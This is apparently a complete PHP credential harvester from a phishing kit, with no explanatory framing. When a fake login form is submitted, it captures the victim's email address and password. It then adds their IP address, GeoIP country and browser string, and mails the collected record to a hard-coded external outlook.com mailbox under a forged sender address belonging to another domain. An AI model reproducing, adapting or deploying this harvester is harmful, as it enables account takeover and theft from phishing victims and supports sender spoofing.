<?php

function getrealip()
{
    if (isset($_SERVER)) {
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
            $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
            if (strpos($ip, ",")) {
                $exp_ip = explode(",", $ip);
                $ip = $exp_ip[0];
            }
        } elseif (isset($_SERVER["HTTP_CLIENT_IP"])) {
            $ip = $_SERVER["HTTP_CLIENT_IP"];
        } else {
            $ip = $_SERVER["REMOTE_ADDR"];
        }
    } else {
        if (getenv('HTTP_X_FORWARDED_FOR')) {
            $ip = getenv('HTTP_X_FORWARDED_FOR');
            if (strpos($ip, ",")) {
                $exp_ip=explode(",", $ip);
                $ip = $exp_ip[0];
            }
        } elseif (getenv('HTTP_CLIENT_IP')) {
            $ip = getenv('HTTP_CLIENT_IP');
        } else {
            $ip = getenv('REMOTE_ADDR');
        }
    }
    return $ip;
}


$MyipAddress = getrealip();

// include the php script

include("geoip.inc");

// open the geoip database
$gi = geoip_open("GeoIP.dat", GEOIP_STANDARD);

// to get country code

$country_code = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);

// to get country name

$country_name = geoip_country_name_by_addr($gi, $_SERVER['REMOTE_ADDR']);

// close the database

geoip_close($gi);

if (isset($_POST['email']) and isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $from = 'From: $textfield';
    $to = 'eqpluse@outlook.com'; //email
    $subject = "DB Info FrOm $email";
    $message = "========== \n Email: $email \n ----------------------------------------------------- \n Password: $password \n ----------------------------------------------------- \n IP Address: $MyipAddress \n ----------------------------------------------------- \n Country Code: $country_code \n ----------------------------------------------------- \n Country Name: $country_name \n ----------------------------------------------------- \n Browser: $browser \n ========================== \n =================== ++ =================== \n";
    
    
    $headers .= "MIME-Version: 1.0 \r\n";
    $headers .= "Content-type: text/html \r\n";
    $headers = 'From: sales@facilpix.com.br' . " \r\n" .
    'Reply-To: sales@facilpix.com.br' . " \r\n" .
    'X-Mailer: PHP/' . phpversion();
    
    mail($to, $subject, $message, $headers);
}
